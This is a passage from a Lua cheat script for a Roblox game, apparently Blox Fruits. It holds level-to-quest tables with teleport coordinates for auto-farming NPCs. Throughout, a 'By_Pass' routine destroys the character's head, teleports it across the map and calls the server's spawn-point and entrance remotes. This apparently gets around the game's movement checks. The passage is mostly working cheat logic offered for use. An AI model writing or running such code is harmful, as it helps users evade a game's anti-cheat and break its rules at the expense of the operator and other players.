                            for i,v in pairs(game:GetService("Workspace").Map.Turtle:GetChildren()) do
                                if v.Name == "Model" and #v:GetChildren() >= 40 and v:FindFirstChild("Meshes/Plank7") and i > 20 then
                                    v:Destroy()
                                    count = count + 1
                                    if count > 2 then
                                        break
                                    end
                                end
                            end
                            end
                        end
                        function CheckQuest()
                            local MyLevel = game.Players.LocalPlayer.Data.Level.Value
                            if OldWorld then
                            if MyLevel == 1 or MyLevel <= 9 then -- Bandit
                                Ms = "Bandit"
                                NaemQuest = "BanditQuest1"
                                LevelQuest = 1
                                NameMon = "Bandit"
                                CFrameQuest = CFrame.new(1061.66699, 16.5166187, 1544.52905, -0.942978859, -3.33851502e-09, 0.332852632, 7.04340497e-09, 1, 2.99841325e-08, -0.332852632, 3.06188177e-08, -0.942978859)
                                CFrameMon = CFrame.new(1199.31287, 52.2717781, 1536.91516, -0.929782331, 6.60215846e-08, -0.368109822, 3.9077392e-08, 1, 8.06501603e-08, 0.368109822, 6.06023249e-08, -0.929782331)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 10 or MyLevel <= 14 then -- Monkey
                                magbring = 400
                                Ms = "Monkey"
                                NaemQuest = "JungleQuest"
                                LevelQuest = 1
                                NameMon = "Monkey"
                                CFrameQuest = CFrame.new(-1604.12012, 36.8521118, 154.23732, 0.0648873374, -4.70858913e-06, -0.997892559, 1.41431883e-07, 1, -4.70933674e-06, 0.997892559, 1.64442184e-07, 0.0648873374)
                                CFrameMon = CFrame.new(-1502.74609, 98.5633316, 90.6417007, 0.836947978, 0, 0.547282517, -0, 1, -0, -0.547282517, 0, 0.836947978)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 500 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 15 or MyLevel <= 29 then -- Gorilla
                                magbring = 240
                                Ms = "Gorilla"
                                NaemQuest = "JungleQuest"
                                LevelQuest = 2
                                NameMon = "Gorilla"
                                CFrameQuest = CFrame.new(-1604.12012, 36.8521118, 154.23732, 0.0648873374, -4.70858913e-06, -0.997892559, 1.41431883e-07, 1, -4.70933674e-06, 0.997892559, 1.64442184e-07, 0.0648873374)
                                CFrameMon = CFrame.new(-1223.52808, 6.27936459, -502.292664, 0.310949147, -5.66602516e-08, 0.950426519, -3.37275488e-08, 1, 7.06501808e-08, -0.950426519, -5.40241736e-08, 0.310949147)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 30 or MyLevel <= 39 then -- Pirate
                                Dis = 150
                                Ms = "Pirate"
                                NaemQuest = "BuggyQuest1"
                                LevelQuest = 1
                                NameMon = "Pirate"
                                CFrameQuest = CFrame.new(-1139.59717, 4.75205183, 3825.16211, -0.959730506, -7.5857054e-09, 0.280922383, -4.06310328e-08, 1, -1.11807175e-07, -0.280922383, -1.18718916e-07, -0.959730506)
                                CFrameMon = CFrame.new(-1219.32324, 4.75205183, 3915.63452, -0.966492832, -6.91238853e-08, 0.25669381, -5.21195496e-08, 1, 7.3047012e-08, -0.25669381, 5.72206496e-08, -0.966492832)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 40 or MyLevel <= 59 then -- Brute
                                Dis = 150
                                Ms = "Brute"
                                NaemQuest = "BuggyQuest1"
                                LevelQuest = 2
                                NameMon = "Brute"
                                CFrameQuest = CFrame.new(-1139.59717, 4.75205183, 3825.16211, -0.959730506, -7.5857054e-09, 0.280922383, -4.06310328e-08, 1, -1.11807175e-07, -0.280922383, -1.18718916e-07, -0.959730506)
                                CFrameMon = CFrame.new(-1146.49646, 96.0936813, 4312.1333, -0.978175163, -1.53222057e-08, 0.207781896, -3.33316912e-08, 1, -8.31738873e-08, -0.207781896, -8.82843523e-08, -0.978175163)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 60 or MyLevel <= 74 then -- Desert Bandit
                                Ms = "Desert Bandit"
                                NaemQuest = "DesertQuest"
                                LevelQuest = 1
                                NameMon = "Desert Bandit"
                                CFrameQuest = CFrame.new(897.031128, 6.43846416, 4388.97168, -0.804044724, 3.68233266e-08, 0.594568789, 6.97835176e-08, 1, 3.24365246e-08, -0.594568789, 6.75715199e-08, -0.804044724)
                                CFrameMon = CFrame.new(932.788818, 6.4503746, 4488.24609, -0.998625934, 3.08948351e-08, 0.0524050146, 2.79967303e-08, 1, -5.60361286e-08, -0.0524050146, -5.44919629e-08, -0.998625934)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 500 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 75 or MyLevel <= 89 then -- Desert Officre
                                Ms = "Desert Officer"
                                NaemQuest = "DesertQuest"
                                LevelQuest = 2
                                NameMon = "Desert Officer"
                                CFrameQuest = CFrame.new(897.031128, 6.43846416, 4388.97168, -0.804044724, 3.68233266e-08, 0.594568789, 6.97835176e-08, 1, 3.24365246e-08, -0.594568789, 6.75715199e-08, -0.804044724)
                                CFrameMon = CFrame.new(1580.03198, 4.61375761, 4366.86426, 0.135744005, -6.44280718e-08, -0.990743816, 4.35738308e-08, 1, -5.90598574e-08, 0.990743816, -3.51534837e-08, 0.135744005)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 90 or MyLevel <= 99 then -- Snow Bandits
                                Ms = "Snow Bandit"
                                NaemQuest = "SnowQuest"
                                LevelQuest = 1
                                NameMon = "Snow Bandits"
                                CFrameQuest = CFrame.new(1384.14001, 87.272789, -1297.06482, 0.348555952, -2.53947841e-09, -0.937287986, 1.49860568e-08, 1, 2.86358204e-09, 0.937287986, -1.50443711e-08, 0.348555952)
                                CFrameMon = CFrame.new(1370.24316, 102.403511, -1411.52905, 0.980274439, -1.12995728e-08, 0.197641045, -9.57343449e-09, 1, 1.04655214e-07, -0.197641045, -1.04482936e-07, 0.980274439)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 500 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 100 or MyLevel <= 119 then -- Snowman
                                Ms = "Snowman"
                                NaemQuest = "SnowQuest"
                                LevelQuest = 2
                                NameMon = "Snowman"
                                CFrameQuest = CFrame.new(1384.14001, 87.272789, -1297.06482, 0.348555952, -2.53947841e-09, -0.937287986, 1.49860568e-08, 1, 2.86358204e-09, 0.937287986, -1.50443711e-08, 0.348555952)
                                CFrameMon = CFrame.new(1370.24316, 102.403511, -1411.52905, 0.980274439, -1.12995728e-08, 0.197641045, -9.57343449e-09, 1, 1.04655214e-07, -0.197641045, -1.04482936e-07, 0.980274439)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 120 or MyLevel <= 149 then -- Chief Petty Officer
                                Ms = "Chief Petty Officer"
                                NaemQuest = "MarineQuest2"
                                LevelQuest = 1
                                NameMon = "Chief Petty Officer"
                                CFrameQuest = CFrame.new(-5035.0835, 28.6520386, 4325.29443, 0.0243340395, -7.08064647e-08, 0.999703884, -6.36926814e-08, 1, 7.23777944e-08, -0.999703884, -6.54350671e-08, 0.0243340395)
                                CFrameMon = CFrame.new(-4882.8623, 22.6520386, 4255.53516, 0.273695946, -5.40380647e-08, -0.96181643, 4.37720793e-08, 1, -4.37274998e-08, 0.96181643, -3.01326679e-08, 0.273695946)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 500 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 150 or MyLevel <= 174 then -- Sky Bandit
                                Ms = "Sky Bandit"
                                NaemQuest = "SkyQuest"
                                LevelQuest = 1
                                NameMon = "Sky Bandit"
                                CFrameQuest = CFrame.new(-4841.83447, 717.669617, -2623.96436, -0.875942111, 5.59710216e-08, -0.482416272, 3.04023082e-08, 1, 6.08195947e-08, 0.482416272, 3.86078725e-08, -0.875942111)
                                CFrameMon = CFrame.new(-4970.74219, 294.544342, -2890.11353, -0.994874597, -8.61311236e-08, -0.101116329, -9.10836206e-08, 1, 4.43614923e-08, 0.101116329, 5.33441664e-08, -0.994874597)
                                if _G.AutoFarmL and _G.By_Pass and (CFrameQuest.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 1000 then
                                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(-4607.82275, 872.54248, -1667.55688))
                                end
                            elseif MyLevel == 175 or MyLevel <= 189 then -- Dark Master
                                Ms = "Dark Master"
                                NaemQuest = "SkyQuest"
                                LevelQuest = 2
                                NameMon = "Dark Master"
                                CFrameQuest = CFrame.new(-4841.83447, 717.669617, -2623.96436, -0.875942111, 5.59710216e-08, -0.482416272, 3.04023082e-08, 1, 6.08195947e-08, 0.482416272, 3.86078725e-08, -0.875942111)
                                CFrameMon = CFrame.new(-5220.58594, 430.693298, -2278.17456, -0.925375521, 1.12086873e-08, 0.379051805, -1.05115507e-08, 1, -5.52320891e-08, -0.379051805, -5.50948407e-08, -0.925375521)
                                if _G.AutoFarmL and _G.By_Pass and (CFrameQuest.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 1000 then
                                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(-4607.82275, 872.54248, -1667.55688))
                                end
                            elseif MyLevel == 190 or MyLevel <= 209 then -- Dark Master
                                Ms = "Prisoner"
                                NaemQuest = "PrisonerQuest"
                                LevelQuest = 1
                                NameMon = "Prisoner"
                                CFrameQuest = CFrame.new(5310.61, 0.350015, 474.947)
                                CFrameMon = CFrame.new(4977.88525390625, 72.67780303955078, 498.108642578125)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 1000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 210 or MyLevel <= 249 then -- Dark Master
                                Ms = "Dangerous Prisoner"
                                NaemQuest = "PrisonerQuest"
                                LevelQuest = 2
                                NameMon = "Dangerous Prisoner"
                                CFrameQuest = CFrame.new(5310.61, 0.350015, 474.947)
                                CFrameMon = CFrame.new(5656.42333984375, 72.67793273925781, 866.1055908203125)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 1000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 250 or MyLevel <= 274 then -- Toga Warrior
                                Ms = "Toga Warrior"
                                NaemQuest = "ColosseumQuest"
                                LevelQuest = 1
                                NameMon = "Toga Warrior"
                                CFrameQuest = CFrame.new(-1576.11743, 7.38933945, -2983.30762, 0.576966345, 1.22114863e-09, 0.816767931, -3.58496594e-10, 1, -1.24185606e-09, -0.816767931, 4.2370063e-10, 0.576966345)
                                CFrameMon = CFrame.new(-1779.97583, 44.6077499, -2736.35474, 0.984437346, 4.10396339e-08, 0.175734788, -3.62286876e-08, 1, -3.05844168e-08, -0.175734788, 2.3741821e-08, 0.984437346)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 1000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 275 or MyLevel <= 299 then -- Gladiato
                                Ms = "Gladiator"
                                NaemQuest = "ColosseumQuest"
                                LevelQuest = 2
                                NameMon = "Gladiato"
                                CFrameQuest = CFrame.new(-1576.11743, 7.38933945, -2983.30762, 0.576966345, 1.22114863e-09, 0.816767931, -3.58496594e-10, 1, -1.24185606e-09, -0.816767931, 4.2370063e-10, 0.576966345)
                                CFrameMon = CFrame.new(-1274.75903, 58.1895943, -3188.16309, 0.464524001, 6.21005611e-08, 0.885560572, -4.80449414e-09, 1, -6.76054768e-08, -0.885560572, 2.71497012e-08, 0.464524001)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 1000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 300 or MyLevel <= 329 then -- Military Soldier
                                Ms = "Military Soldier"
                                NaemQuest = "MagmaQuest"
                                LevelQuest = 1
                                NameMon = "Military Soldier"
                                CFrameQuest = CFrame.new(-5316.55859, 12.2370615, 8517.2998, 0.588437557, -1.37880001e-08, -0.808542669, -2.10116209e-08, 1, -3.23446478e-08, 0.808542669, 3.60215964e-08, 0.588437557)
                                CFrameMon = CFrame.new(-5363.01123, 41.5056877, 8548.47266, -0.578253984, -3.29503091e-10, 0.815856814, 9.11209668e-08, 1, 6.498761e-08, -0.815856814, 1.11920997e-07, -0.578253984)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 1000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 325 or MyLevel <= 374 then -- Military Spy
                                FM = false
                                Ms = "Military Spy"
                                NaemQuest = "MagmaQuest"
                                LevelQuest = 2
                                NameMon = "Military Spy"
                                CFrameQuest = CFrame.new(-5316.55859, 12.2370615, 8517.2998, 0.588437557, -1.37880001e-08, -0.808542669, -2.10116209e-08, 1, -3.23446478e-08, 0.808542669, 3.60215964e-08, 0.588437557)
                                CFrameMon = CFrame.new(-5787.99023, 120.864456, 8762.25293, -0.188358366, -1.84706277e-08, 0.982100308, -1.23782129e-07, 1, -4.93306951e-09, -0.982100308, -1.22495649e-07, -0.188358366)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 1000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 375 or MyLevel <= 399 then -- Fishman Warrior
                                FM = true
                                Ms = "Fishman Warrior"
                                NaemQuest = "FishmanQuest"
                                LevelQuest = 1
                                NameMon = "Fishman Warrior"
                                CFrameQuest = CFrame.new(61122.5625, 18.4716396, 1568.16504, 0.893533468, 3.95251609e-09, 0.448996574, -2.34327455e-08, 1, 3.78297464e-08, -0.448996574, -4.43233645e-08, 0.893533468)
                                CFrameMon = CFrame.new(60946.6094, 48.6735229, 1525.91687, -0.0817126185, 8.90751153e-08, 0.996655822, 2.00889794e-08, 1, -8.77269599e-08, -0.996655822, 1.28533992e-08, -0.0817126185)
                                if _G.AutoFarmL and _G.By_Pass and (CFrameQuest.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
                                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(61163.8515625, 11.6796875, 1819.7841796875))
                                end
                            elseif MyLevel == 400 or MyLevel <= 449 then -- Fishman Commando
                                FM = true
                                Ms = "Fishman Commando"
                                NaemQuest = "FishmanQuest"
                                LevelQuest = 2
                                NameMon = "Fishman Commando"
                                CFrameQuest = CFrame.new(61122.5625, 18.4716396, 1568.16504, 0.893533468, 3.95251609e-09, 0.448996574, -2.34327455e-08, 1, 3.78297464e-08, -0.448996574, -4.43233645e-08, 0.893533468)
                                CFrameMon = CFrame.new(61885.5039, 18.4828243, 1504.17896, 0.577502489, 0, -0.816389024, -0, 1.00000012, -0, 0.816389024, 0, 0.577502489)
                                if _G.AutoFarmL and _G.By_Pass and (CFrameQuest.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
                                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(61163.8515625, 11.6796875, 1819.7841796875))
                                end
                            elseif MyLevel == 450 or MyLevel <= 474 then -- God's Guards
                                FM = false
                                Ms = "God's Guard"
                                NaemQuest = "SkyExp1Quest"
                                LevelQuest = 1
                                NameMon = "God's Guards"
                                CFrameQuest = CFrame.new(-4721.71436, 845.277161, -1954.20105, -0.999277651, -5.56969759e-09, 0.0380011722, -4.14751478e-09, 1, 3.75035256e-08, -0.0380011722, 3.73188307e-08, -0.999277651)
                                CFrameMon = CFrame.new(-4716.95703, 853.089722, -1933.92542, -0.93441087, -6.77488776e-09, -0.356197298, 1.12145182e-08, 1, -4.84390199e-08, 0.356197298, -4.92565206e-08, -0.93441087)
                                if _G.AutoFarmL and _G.By_Pass and (CFrameQuest.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
                                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(-4607.82275, 872.54248, -1667.55688))
                                end
                            elseif MyLevel == 475 or MyLevel <= 524 then -- Shandas
                                sky = false
                                Ms = "Shanda"
                                NaemQuest = "SkyExp1Quest"
                                LevelQuest = 2
                                NameMon = "Shanda"
                                CFrameQuest = CFrame.new(-7863.63672, 5545.49316, -379.826324, 0.362120807, -1.98046344e-08, -0.93213129, 4.05822291e-08, 1, -5.48095125e-09, 0.93213129, -3.58431969e-08, 0.362120807)
                                CFrameMon = CFrame.new(-7685.12354, 5601.05127, -443.171509, 0.150056243, 1.79768236e-08, -0.988677442, 6.67798661e-09, 1, 1.91962481e-08, 0.988677442, -9.48289181e-09, 0.150056243)
                                if _G.AutoFarmL and _G.By_Pass and (CFrameQuest.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
                                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(-7894.6176757813, 5547.1416015625, -380.29119873047))
                                end
                            elseif MyLevel == 525 or MyLevel <= 549 then -- Royal Squad
                                sky = true
                                Ms = "Royal Squad"
                                NaemQuest = "SkyExp2Quest"
                                LevelQuest = 1
                                NameMon = "Royal Squad"
                                CFrameQuest = CFrame.new(-7902.66895, 5635.96387, -1411.71802, 0.0504222959, 2.5710392e-08, 0.998727977, 1.12541557e-07, 1, -3.14249675e-08, -0.998727977, 1.13982921e-07, 0.0504222959)
                                CFrameMon = CFrame.new(-7685.02051, 5606.87842, -1442.729, 0.561947823, 7.69527464e-09, -0.827172697, -4.24974544e-09, 1, 6.41599973e-09, 0.827172697, -9.01838604e-11, 0.561947823)
                            elseif MyLevel == 550 or MyLevel <= 624 then -- Royal Soldier
                                Dis = 240
                                sky = true
                                Ms = "Royal Soldier"
                                NaemQuest = "SkyExp2Quest"
                                LevelQuest = 2
                                NameMon = "Royal Soldier"
                                CFrameQuest = CFrame.new(-7902.66895, 5635.96387, -1411.71802, 0.0504222959, 2.5710392e-08, 0.998727977, 1.12541557e-07, 1, -3.14249675e-08, -0.998727977, 1.13982921e-07, 0.0504222959)
                                CFrameMon = CFrame.new(-7864.44775, 5661.94092, -1708.22351, 0.998389959, 2.28686137e-09, -0.0567218624, 1.99431383e-09, 1, 7.54200258e-08, 0.0567218624, -7.54117195e-08, 0.998389959)
                            elseif MyLevel == 625 or MyLevel <= 649 then -- Galley Pirate
                                Dis = 240
                                sky = false
                                Ms = "Galley Pirate"
                                NaemQuest = "FountainQuest"
                                LevelQuest = 1
                                NameMon = "Galley Pirate"
                                CFrameQuest = CFrame.new(5254.60156, 38.5011406, 4049.69678, -0.0504891425, -3.62066501e-08, -0.998724639, -9.87921389e-09, 1, -3.57534553e-08, 0.998724639, 8.06145284e-09, -0.0504891425)
                                CFrameMon = CFrame.new(5595.06982, 41.5013695, 3961.47095, -0.992138803, -2.11610267e-08, -0.125142589, -1.34249509e-08, 1, -6.26613996e-08, 0.125142589, -6.04887518e-08, -0.992138803)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel >= 650 then -- Galley Captain
                                Dis = 240
                                Ms = "Galley Captain"
                                NaemQuest = "FountainQuest"
                                LevelQuest = 2
                                NameMon = "Galley Captain"
                                CFrameQuest = CFrame.new(5254.60156, 38.5011406, 4049.69678, -0.0504891425, -3.62066501e-08, -0.998724639, -9.87921389e-09, 1, -3.57534553e-08, 0.998724639, 8.06145284e-09, -0.0504891425)
                                CFrameMon = CFrame.new(5658.5752, 38.5361786, 4928.93506, -0.996873081, 2.12391046e-06, -0.0790185928, 2.16989656e-06, 1, -4.96097414e-07, 0.0790185928, -6.66008248e-07, -0.996873081)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            end
                        elseif NewWorld then
                            local MyLevel = game.Players.LocalPlayer.Data.Level.Value
                            Dis = 240
                            if MyLevel == 700 or MyLevel <= 724 then -- Raider
                                Ms = "Raider"
                                NaemQuest = "Area1Quest"
                                LevelQuest = 1
                                NameMon = "Raider"
                                CFrameQuest = CFrame.new(-424.080078, 73.0055847, 1836.91589, 0.253544956, -1.42165932e-08, 0.967323601, -6.00147771e-08, 1, 3.04272909e-08, -0.967323601, -6.5768397e-08, 0.253544956)
                                CFrameMon = CFrame.new(-217.138626, 39.2450829, 2393.54468, 0.146848485, 0, -0.989159107, 0, 1, 0, 0.989159107, 0, 0.146848485)
                            elseif MyLevel == 725 or MyLevel <= 774 then -- Mercenary
                                Ms = "Mercenary"
                                NaemQuest = "Area1Quest"
                                LevelQuest = 2
                                NameMon = "Mercenary"
                                CFrameQuest = CFrame.new(-424.080078, 73.0055847, 1836.91589, 0.253544956, -1.42165932e-08, 0.967323601, -6.00147771e-08, 1, 3.04272909e-08, -0.967323601, -6.5768397e-08, 0.253544956)
                                CFrameMon = CFrame.new(-973.731995, 95.8733215, 1836.46936, 0.999135971, 2.02326991e-08, -0.0415605344, -1.90767793e-08, 1, 2.82094952e-08, 0.0415605344, -2.73922804e-08, 0.999135971)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 1000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 775 or MyLevel <= 799 then -- Swan Pirate
                                Ms = "Swan Pirate"
                                NaemQuest = "Area2Quest"
                                LevelQuest = 1
                                NameMon = "Swan Pirate"
                                CFrameQuest = CFrame.new(632.698608, 73.1055908, 918.666321, -0.0319722369, 8.96074881e-10, -0.999488771, 1.36326533e-10, 1, 8.92172336e-10, 0.999488771, -1.07732087e-10, -0.0319722369)
                                CFrameMon = CFrame.new(970.369446, 142.653198, 1217.3667, 0.162079468, -4.85452638e-08, -0.986777723, 1.03357589e-08, 1, -4.74980872e-08, 0.986777723, -2.50063148e-09, 0.162079468)
                            elseif MyLevel == 800 or MyLevel <= 874 then -- Factory Staff
                                Ms = "Factory Staff"
                                NaemQuest = "Area2Quest"
                                LevelQuest = 2
                                NameMon = "Factory Staff"
                                CFrameQuest = CFrame.new(632.698608, 73.1055908, 918.666321, -0.0319722369, 8.96074881e-10, -0.999488771, 1.36326533e-10, 1, 8.92172336e-10, 0.999488771, -1.07732087e-10, -0.0319722369)
                                CFrameMon = CFrame.new(296.786499, 72.9948196, -57.1298141, -0.876037002, -5.32364979e-08, 0.482243896, -3.87658332e-08, 1, 3.99718729e-08, -0.482243896, 1.63222538e-08, -0.876037002)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 875 or MyLevel <= 899 then -- Marine Lieutenant
                                Ms = "Marine Lieutenant"
                                NaemQuest = "MarineQuest3"
                                LevelQuest = 1
                                NameMon = "Marine Lieutenant"
                                CFrameQuest = CFrame.new(-2442.65015, 73.0511475, -3219.11523, -0.873540044, 4.2329841e-08, -0.486752301, 5.64383384e-08, 1, -1.43220786e-08, 0.486752301, -3.99823996e-08, -0.873540044)
                                CFrameMon = CFrame.new(-2913.26367, 73.0011826, -2971.64282, 0.910507619, 0, 0.413492233, 0, 1.00000012, 0, -0.413492233, 0, 0.910507619)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 900 or MyLevel <= 949 then -- Marine Captain
                                Ms = "Marine Captain"
                                NaemQuest = "MarineQuest3"
                                LevelQuest = 2
                                NameMon = "Marine Captain"
